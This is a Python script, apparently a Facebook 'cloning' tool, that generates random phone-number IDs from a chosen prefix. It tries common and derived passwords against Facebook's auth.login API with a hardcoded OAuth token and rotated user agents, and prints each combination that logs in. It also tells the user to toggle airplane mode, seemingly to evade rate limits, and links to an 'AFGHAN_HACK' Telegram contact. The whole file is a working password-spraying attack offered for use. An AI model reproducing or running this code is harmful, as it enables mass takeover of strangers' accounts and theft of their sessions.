import os, time, random, string, sys, uuid, json, asyncio, aiohttp

numbs = set()
loop = 0
ok_ids = []
cp_ids = []

user_agents = [
    "Mozilla/5.0 (Linux; Android 10; K)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
]

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def main():
    clear()
    print(" | [1] Random Cloning")
    print(" | [2] Contact Admin")
    print(" | [3] Exit Program")
    inp = input(' | Choose : ').strip()
    
    if inp == '1':
        asyncio.run(random_clone())
    elif inp == '2':
        os.system('xdg-open https://t.me/AFGHAN_HACK')
    elif inp == '3':
        print(' | Have a nice day')
        exit()
    else:
        print(' | option not found in menu')
        time.sleep(2)
        main()

async def random_clone():
    clear()
    code = input(' | Choose Code : ').strip()
    try:
        limit = int(input(' | Put Limit : ').strip())
    except ValueError:
        limit = 5000

    while len(numbs) < limit:
        numb = ''.join(random.choice(string.digits) for _ in range(7))
        numbs.add(numb)

    print(f' | Method : Async Cloning | Limit : {len(numbs)}')
    print(' | ON/OFF Airplane mode before use')

    tasks = []
    async with aiohttp.ClientSession() as session:
        for number in numbs:
            ids = code + number
            passwords = [number, ids, '123456', '12345678', 'afghanistan', 'afg123']
            tasks.append(start_clone(session, ids, passwords))
        
        await asyncio.gather(*tasks)

async def start_clone(session, ids, passwords):
    global loop
    url = 'https://b-api.facebook.com/method/auth.login'
    
    for pas in passwords:
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_session_cookies': '1',
            'locale': 'en_GB',
            'client_country_code': 'GB'
        }
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }

        try:
            async with session.post(url, data=data, headers=headers) as response:
                data2 = await response.json()
                if 'session_key' in data2:
                    print(f'\r | [OK] {ids} | {pas}')
                    ok_ids.append(ids)
                    break
        except:
            pass
        
    loop += 1
    sys.stdout.write(f'\r | Checked: {loop}/{len(numbs)} | OK: {len(ok_ids)} | CP: {len(cp_ids)}')
    sys.stdout.flush()

main()